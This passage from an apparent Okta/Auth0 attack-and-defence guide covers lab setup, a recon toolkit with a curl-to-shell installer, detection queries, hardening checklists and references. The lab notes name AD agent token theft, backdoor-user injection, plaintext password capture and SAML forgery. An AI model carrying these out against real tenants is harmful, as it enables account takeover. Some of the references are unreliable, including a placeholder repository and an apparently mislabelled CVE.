5. The org is active immediately; no credit card required
6. Limitations:
   - 5 user cap (upgradeable)
   - Some advanced features (high-volume API limits, advanced Server) not included
   - Not for production use
```

### 10.2 Free Auth0 tenant

Auth0 (owned by Okta since 2021) offers a free tier:

```
Steps:
1. Visit https://auth0.com/signup
2. Sign up with any email
3. Choose a region (US, EU, AU)
4. Receive a tenant URL: REPLACE_WITH_YOUR_TENANT.us.auth0.com
5. Default plan: Free
   - 7,000 monthly active users
   - Unlimited logins
   - Social login
   - Custom domain (with paid upgrade)
6. Management API is fully accessible
```

### 10.3 Okta + on-prem AD lab (Okta AD Agent)

For testing Okta-AD synchronization attacks:

```
VMs:
  - dc01.corp.local (Windows Server 2022, AD DS)
  - okta-agent.corp.local (Windows Server 2022, Okta AD Agent)
  - win10-01.corp.local (Windows 10/11, optional)

Steps:
1. Set up corp.local AD (dc01)
2. Sign up for Okta Developer org (per §10.1)
3. In Okta admin: Directory > Integrations > Active Directory > Add
4. Download the Okta AD Agent installer
5. Install on okta-agent.corp.local; configure with Okta org URL and admin credentials
6. Authorize the agent (Okta generates a token; agent presents it)
7. Configure import/scoping rules: which OUs to sync
8. Run the first sync; verify corp.local\Users appear in Okta Universal Directory
9. Configure password auth: enable "Password" for the AD-integrated Okta users
10. Test: sign in to Okta with on-prem credentials — password is validated via the agent → AD

This lab lets you test:
- AD agent token theft (extract the agent token from its config)
- Sync tampering (modify agent config to inject backdoor users)
- Password proxy interception (capture plaintext passwords in the agent)
```

### 10.4 Okta SSO to SaaS app lab

For testing SSO/SAML/OIDC federation:

```
Steps:
1. In Okta Developer org, add a SAML 2.0 app (use a SAML SP like SimpleSAMLphp or saml-test)
2. Configure Okta to be the IdP; provide metadata URL to the SP
3. Configure the SP with Okta's metadata URL
4. Test sign-in: Okta → SP SAML assertion → SP authenticates
5. Steal the SAML signing cert (via Okta admin) — forge SAML responses
6. Test SSO with multiple apps to demonstrate lateral movement
```

### 10.5 Recon toolkit installation

```bash
# Install jq, curl, openssl (basics)
brew install jq curl openssl  # macOS
# Or: apt install jq curl openssl  # Debian/Ubuntu

# Install Python (3.10+)
brew install python@3.11

# Install auth0-cli
brew install auth0-cli
# Or: curl -sSfL https://raw.githubusercontent.com/auth0/auth0-cli/main/install.sh | sh

# Install oauth2l
go install github.com/google/oauth2l@latest

# Install Python JWT library (for CVE reproduction)
pip3 install pyjwt cryptography

# Install SAML libraries (for SAML forgery)
pip3 install python3-saml lxml

# oktascript / community Okta tooling
git clone https://github.com/samjot/okta-tools.git /opt/okta-tools  # placeholder, varies

# BloodHound CE (no Okta ingestor yet, but useful for federated AAD graphs)
# See https://github.com/SpecterOps/BloodHound

# Verify
auth0 --version
oauth2l version
```

---

## 11. Detection & Hardening

### 11.1 Okta detection signals

| Signal | Source | What it catches |
|--------|--------|------------------|
| **New admin role assignment** | Okta System Log | Privilege escalation |
| **MFA factor reset** | Okta System Log | Account takeover via helpdesk |
| **MFA factor enrollment (unexpected)** | Okta System Log | Factor enrollment by attacker |
| **Session token replay from new IP / device** | Okta System Log | Session theft |
| **Excessive MFA denials (>5 in 5 min)** | Okta System Log | MFA fatigue |
| **Suspicious app assignment** | Okta System Log | Backdoor app access |
| **API token creation** | Okta System Log | Persistence via API token |
| **User password reset for many users in short window** | Okta System Log | Mass account takeover |
| **Sign-in from impossible travel** | Okta Identity Threat Inspect | Token replay |
| **Rate limit trigger** | Okta System Log | Credential stuffing |
| **Sign-in via deprecated factor (SMS) for admin** | Okta System Log | Admin MFA weakness |
| **Custom app added without SSO review** | Okta System Log | Backdoor app |

### 11.2 Okta System Log queries (Okta API)

```bash
# Fetch the Okta System Log (admin token required)
curl -s -H "Authorization: SSWS $OKTA_API_TOKEN" \
  "$OKTA_ORG/api/v1/logs?since=2026-06-26T00:00:00.000Z&until=2026-06-27T00:00:00.000Z&limit=1000" \
  | jq '.[] | {published: .published, eventType, actor: .actor.alternateId, target: .target[0].alternateId, outcome: .outcome.result}'

# Filter for high-severity events
curl -s -H "Authorization: SSWS $OKTA_API_TOKEN" \
  "$OKTA_ORG/api/v1/logs?filter=eventType eq 'user.account.lock' or eventType eq 'user.mfa.factor.deactivate' or eventType eq 'system.org.rate_limit.warning'" \
  | jq '.[]'

# Detect MFA fatigue
curl -s -H "Authorization: SSWS $OKTA_API_TOKEN" \
  "$OKTA_ORG/api/v1/logs?filter=eventType eq 'user.authentication.auth_via_mfa' and outcome.result eq 'FAILURE'" \
  | jq 'group_by(.actor.alternateId) | map({user: .[0].actor.alternateId, denials: length}) | map(select(.denials > 5))'
```

### 11.3 Auth0 detection signals

| Signal | Source | What it catches |
|--------|--------|------------------|
| **New Management API client created** | Auth0 logs | Backdoor M2M client |
| **Action / Rule modified** | Auth0 logs | Code injection |
| **Custom database script modified** | Auth0 logs | Connection script backdoor |
| **New admin user added** | Auth0 logs | Privilege escalation |
| **Suspicious token issuance** (new aud, unusual scp) | Auth0 logs | Token abuse |
| **Failed login spike** | Auth0 anomaly detection | Credential stuffing |
| **Impossible travel** | Auth0 anomaly detection | Token replay |
| **JWT algorithm header anomaly** (HS256 for RS256 tenant) | Custom log rule | CVE-2022-23539 exploitation |

### 11.4 Auth0 log queries (Management API)

```bash
# Fetch Auth0 logs
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/logs?per_page=100&sort=-date" \
  | jq '.[] | {date, type, description, user_name, client_name, ip}'

# Filter for management events
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/logs?q=type:\"sapi\" AND (description:\"Create a client\" OR description:\"Update a rule\")" \
  | jq '.[]'
```

### 11.5 Okta hardening checklist (priority order)

1. **Disable SMS and voice MFA** for admin accounts. Require Okta Verify or FIDO2.
2. **Number matching in Okta Verify** — enable if available.
3. **Phishing-resistant MFA (FIDO2 / WebAuthn)** for super admins.
4. **Rate limit thresholds** — tighten for high-value endpoints (admin login, password reset).
5. **App access policies** — every app has a sign-on policy requiring MFA.
6. **Device assurance** — require managed / compliant device for sensitive apps.
7. **Third-party support vendor audit** — review which vendors have admin/support access; minimize.
8. **Self-service MFA reset** — require step-up authentication; not just email verification.
9. **Okta admin SSO separation** — admins use a separate Okta tenant or a dedicated admin profile.
10. **Okta System Log to SIEM** — pipe to Splunk / Sentinel / Elastic with alerts on critical events.
11. **Action / Rule code review** — quarterly diff review of all deployed Actions and Rules.
12. **Custom database script review** — quarterly review; secret rotation.

### 11.6 Auth0 hardening checklist

1. **Disable Rules** — migrate to Actions.
2. **Pin JWT algorithm to RS256 or asymmetric** — no HS256 with shared secrets in production.
3. **Update `jsonwebtoken` library** to 9.0.0+ (CVE-2022-23539 fix).
4. **Management API access via M2M only** — no user-context tokens for Management API.
5. **Action / Rule code review** — quarterly.
6. **Custom database script review** — quarterly; secrets in Auth0 secrets store, not in code.
7. **Rate limiting** — tighten for high-value endpoints (signup, login).
8. **Anomaly detection** — enable impossible travel, breached password detection.
9. **Bot detection** — enable for customer-facing apps (Cloudflare Turnstile, hCaptcha).
10. **Log streaming** — stream logs to Datadog / Splunk / CloudWatch.
11. **Tenant isolation** — separate tenants for dev, staging, prod. No credential reuse.

### 11.7 Post-October 2023 specific hardening

After the Okta support system breach (Oct 2023), recommended:

- **Never share long-lived credentials with vendors in support tickets.** Use short-lived (15-min) tokens or scoped credentials.
- **Audit support ticket history** for any long-lived credentials shared in the past.
- **Treat vendor support systems as untrusted** — assume any credential shared with a vendor will eventually be exposed.
- **Anomaly detection on session replay** — alert when a session is used from a new IP / device / country.

---

## 12. References

### 12.1 Vendor documentation

- Okta Developer Documentation: <https://developer.okta.com/>
- Okta Identity Engine docs: <https://help.okta.com/oie/>
- Okta API Reference: <https://developer.okta.com/docs/reference/>
- Okta System Log: <https://developer.okta.com/docs/reference/api/system-log/>
- Auth0 Documentation: <https://auth0.com/docs>
- Auth0 Management API: <https://auth0.com/docs/api/management/v2>
- Auth0 Actions: <https://auth0.com/docs/customize/actions>

### 12.2 Protocols

- OAuth 2.0 RFC 6749: <https://datatracker.ietf.org/doc/html/rfc6749>
- OpenID Connect Core 1.0: <https://openid.net/specs/openid-connect-core-1_0.html>
- SAML 2.0 Core: <https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf>
- JWT RFC 7519: <https://datatracker.ietf.org/doc/html/rfc7519>
- WebAuthn (FIDO2): <https://www.w3.org/TR/webauthn-2/>

### 12.3 Incident references

- Okta Lapsus$ SonicWall agent compromise (Jan 2022): <https://sec.okta.com/articles/2022/03/updated-statement-regarding-situation-involving-one-our-third-party-vendors>
- CISA AA22-040A (Lapsus$ MFA fatigue + Okta): <https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a>
- Cloudflare Okta compromise disclosure (Oct 2023): <https://blog.cloudflare.com/cloudflare-investigation-of-the-october-2023-okta-compromise/>
- BeyondTrust Okta support case leak (Oct 2023): <https://www.beyondtrust.com/blog/entry/okta-support-unit-breach>
- Okta October 2023 disclosure: <https://sec.okta.com/harfiles>
- 23andMe breach disclosure (Oct 2023): <https://www.23andme.com/security-announcement/>
- Krebs on Security Lapsus$ coverage: <https://krebsonsecurity.com/>

### 12.4 CVEs

- CVE-2022-23539 (jsonwebtoken algorithm confusion): <https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-27h2-hvpr-p74q>
- CVE-2022-24329 (Okta Verify session storage): Okta security advisory
- CVE-2023-27997 (FortiOS SSL-VPN — adjacent, not Auth0 directly): <https://www.fortiguard.com/psirt/FG-IR-23-097>
- CVE-2024-21882 (OIDC flow confusion — pattern reference): various library-specific

### 12.5 Tools

- auth0-cli: <https://github.com/auth0/auth0-cli>
- oauth2l: <https://github.com/google/oauth2l>
- Okta Terraform provider: <https://registry.terraform.io/providers/okta/okta/>
- jsonwebtoken (Node.js): <https://github.com/auth0/node-jsonwebtoken>
- python3-saml: <https://github.com/onelogin/python3-saml>
- PyJWT: <https://github.com/jpadilla/pyjwt>

### 12.6 Research blogs

- Okta security research: <https://sec.okta.com/>
- Auth0 blog: <https://auth0.com/blog>
- Cloudflare research: <https://blog.cloudflare.com/>
- Mandiant (Lapsus$ analysis): <https://www.mandiant.com/resources/lapsus-group>
- CrowdStrike (Lapsus$ analysis): <https://www.crowdstrike.com/blog/>
- Microsoft MSTIC (Lapsus$ analysis): <https://www.microsoft.com/en-us/security/blog>
